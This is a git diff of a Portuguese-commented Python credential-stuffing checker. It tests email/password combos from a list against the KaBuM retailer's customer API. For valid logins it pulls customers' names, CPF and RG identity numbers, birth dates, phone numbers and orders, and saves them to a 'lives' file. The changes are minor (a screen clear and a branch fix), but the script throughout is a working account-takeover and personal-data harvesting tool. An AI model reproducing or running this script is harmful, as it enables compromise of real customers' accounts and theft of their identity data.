@@ -2,9 +2,11 @@
 # NOSSOS GITHUB: https://github.com/pedrokpp  |  https://github.com/KaiserD3V/
 import requests
 import colorama
+import os
 from colorama import Fore, Back, Style
 colorama.init()
 
+os.system("cls")
 a = open("lista.txt", "r", encoding="utf8")
 
 file = [s.strip() for s in a.readlines()]
@@ -25,7 +27,7 @@ for lines in file:
     decisivo = r2["valido"]
     if decisivo == False:
         print(Fore.RED + 'Email ou senha invalidos.')
-    else:
+    elif decisivo == True:
         idclient = r2["id_cliente"]
         r3 = requests.get(
             f'https://servicespub.prod.api.aws.grupokabum.com.br/cliente/v2/cliente?id_cliente={idclient}&session={sessid}', headers=h2).json()
@@ -48,3 +50,5 @@ for lines in file:
         f = open("lives.txt", "a")
         f.write(f"{combo[0]}|{combo[1]} » Nome: {nome} » Sexo: {sex} » CPF: {cpf} » RG: {rg} » Data De Nascimento: {dtnascimento} » Celular: {cell} » Pedidos: {pedidos}\n\n")
         f.close()
+    else:
+        print(Fore.RED + 'Email ou senha invalidos.')
